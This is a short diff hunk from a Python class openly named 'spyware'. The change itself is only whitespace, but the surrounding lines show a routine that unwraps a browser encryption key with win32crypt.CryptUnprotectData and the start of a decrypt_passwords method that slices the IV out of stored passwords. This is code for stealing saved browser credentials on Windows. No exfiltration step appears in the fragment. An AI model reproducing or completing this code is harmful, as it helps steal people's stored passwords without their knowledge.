@@ -31,7 +31,7 @@ class spyware:
         encryption_key = encryption_key[5:]
         
         return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
-   
+
     def decrypt_passwords(self, password, encryption_key):
         try:
             iv = password[3:15]
